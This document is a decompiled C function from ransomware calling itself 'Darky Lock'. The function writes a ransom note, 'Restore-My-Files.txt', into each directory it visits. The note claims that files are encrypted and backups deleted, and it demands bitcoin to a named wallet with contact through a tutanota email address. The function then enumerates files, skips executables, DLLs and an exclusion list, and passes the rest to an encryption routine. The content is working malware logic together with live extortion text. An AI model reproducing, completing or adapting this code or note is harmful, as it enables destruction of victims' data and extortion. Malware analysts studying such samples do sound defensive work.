int __cdecl sub_40A300(LPCWSTR lpString2)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  DWORD v4; // eax
  CHAR *v6; // [esp-10h] [ebp-288h]
  int v7; // [esp-Ch] [ebp-284h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+0h] [ebp-278h] BYREF
  DWORD NumberOfBytesWritten; // [esp+250h] [ebp-28h] BYREF
  int v10; // [esp+254h] [ebp-24h] BYREF
  int cbMultiByte; // [esp+258h] [ebp-20h]
  LPSTR lpMultiByteStr; // [esp+25Ch] [ebp-1Ch]
  HANDLE hFindFile; // [esp+260h] [ebp-18h]
  LPVOID lpMem; // [esp+264h] [ebp-14h]
  HANDLE hFile; // [esp+268h] [ebp-10h]
  unsigned int i; // [esp+26Ch] [ebp-Ch]
  int j; // [esp+270h] [ebp-8h]
  LPWSTR lpString1; // [esp+274h] [ebp-4h]

  lpString1 = (LPWSTR)sub_412E30(0x10000);
  if ( lpString1 )
  {
    lstrcpyW(lpString1, lpString2);
    lstrcatW(lpString1, L"\\Restore-My-Files.txt");
    hFile = CreateFileW(lpString1, 0x40000000u, 1u, 0, 1u, 0, 0);
    if ( hFile != (HANDLE)-1 )
    {
      v1 = lstrlenA(
             "\r\n"
             "---------- Hello -----------\r\n"
             "\r\n"
             " ***WELCOME TO DARKY LOCK ***\r\n"
             "\r\n"
             "Your computers and servers are encrypted, and backups are deleted.\r\n"
             "We use strong encryption algorithms, so no one has yet been able to decrypt their files without our partici"
             "pation.\r\n"
             "\r\n"
             "The only way to decrypt your files is to purchase a universal decoder from us, which will restore all the e"
             "ncrypted data and your network.\r\n"
             "\r\n"
             "Follow our instructions below, and you will recover all your data:\r\n"
             "\r\n"
             "1) Pay 0.005 bitcoin to 1E6cvG6iEbufvYspsDa3XQ3WJgEMvRTm9i\r\n"
             "2) Send us message with transaction id to darkylock@tutanota.com\r\n"
             "3) Launch decrypt_bit.exe, which our support will send you  through email\r\n"
             "\r\n"
             "What guarantees?\r\n"
             "------------------\r\n"
             "We value our reputation. If we will not do our work and liabilities, nobody will pay us. This is not in our"
             " interests.\r\n"
             "All our decryption software is tested by time and will decrypt all your data.\r\n"
             "------------------\r\n"
             "\r\n"
             "!!! DO NOT TRY TO RECOVER ANY FILES YOURSELF. WE WILL NOT BE ABLE TO RESTORE THEM!!!");
      WriteFile(
        hFile,
        "\r\n"
        "---------- Hello -----------\r\n"
        "\r\n"
        " ***WELCOME TO DARKY LOCK ***\r\n"
        "\r\n"
        "Your computers and servers are encrypted, and backups are deleted.\r\n"
        "We use strong encryption algorithms, so no one has yet been able to decrypt their files without our participatio"
        "n.\r\n"
        "\r\n"
        "The only way to decrypt your files is to purchase a universal decoder from us, which will restore all the encryp"
        "ted data and your network.\r\n"
        "\r\n"
        "Follow our instructions below, and you will recover all your data:\r\n"
        "\r\n"
        "1) Pay 0.005 bitcoin to 1E6cvG6iEbufvYspsDa3XQ3WJgEMvRTm9i\r\n"
        "2) Send us message with transaction id to darkylock@tutanota.com\r\n"
        "3) Launch decrypt_bit.exe, which our support will send you  through email\r\n"
        "\r\n"
        "What guarantees?\r\n"
        "------------------\r\n"
        "We value our reputation. If we will not do our work and liabilities, nobody will pay us. This is not in our inte"
        "rests.\r\n"
        "All our decryption software is tested by time and will decrypt all your data.\r\n"
        "------------------\r\n"
        "\r\n"
        "!!! DO NOT TRY TO RECOVER ANY FILES YOURSELF. WE WILL NOT BE ABLE TO RESTORE THEM!!!",
        v1,
        &NumberOfBytesWritten,
        0);
      CloseHandle(hFile);
    }
    lstrcpyW(lpString1, lpString2);
    lstrcatW(lpString1, L"\\*");
    hFindFile = FindFirstFileW(lpString1, &FindFileData);
    if ( hFindFile == (HANDLE)-1 )
    {
      if ( dword_41425C )
      {
        v2 = lstrlenW(lpString2);
        cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, lpString2, v2, 0, 0, 0, 0);
        lpMultiByteStr = (LPSTR)sub_412E30(cbMultiByte);
        v7 = cbMultiByte;
        v6 = lpMultiByteStr;
        v3 = lstrlenW(lpString2);
        WideCharToMultiByte(0xFDE9u, 0, lpString2, v3, v6, v7, 0, 0);
        v4 = GetLastError();
        ((void (__cdecl *)(const char *, LPSTR, DWORD))((char *)&loc_404D1F + 1))(
          "Can't FindFirstFileW",
          lpMultiByteStr,
          v4);
        sub_412E60(lpMultiByteStr);
      }
    }
    else
    {
      do
      {
        for ( i = 0; i < 0x22; ++i )
        {
          if ( !lstrcmpiW(FindFileData.cFileName, (&::lpString2)[i]) )
            goto LABEL_25;
        }
        lstrcpyW(lpString1, lpString2);
        lstrcatW(lpString1, L"\\");
        lstrcatW(lpString1, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) == 0 && lstrcmpW(FindFileData.cFileName, L"Restore-My-Files.txt") )
        {
          for ( j = lstrlenW(FindFileData.cFileName) - 1; ; --j )
          {
            if ( j < 0 )
              goto LABEL_20;
            if ( FindFileData.cFileName[j] == 46 )
              break;
          }
          if ( lstrcmpiW(&FindFileData.cFileName[j], L".exe")
            && lstrcmpiW(&FindFileData.cFileName[j], L".dll")
            && lstrcmpiW(&FindFileData.cFileName[j], L".darky") )
          {
LABEL_20:
            while ( !sub_412FA0((int)&unk_4141FC, lpString1, 0) )
            {
              v10 = 0;
              while ( 1 )
              {
                lpMem = (LPVOID)sub_412F00(&unk_4141FC, 0, &v10);
                if ( !lpMem )
                  break;
                sub_409770((LPCWSTR)lpMem);
                sub_412E60(lpMem);
              }
            }
            continue;
          }
        }
LABEL_25:
        ;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
    }
    sub_412E60(lpString1);
  }
  return nullsub_12();
}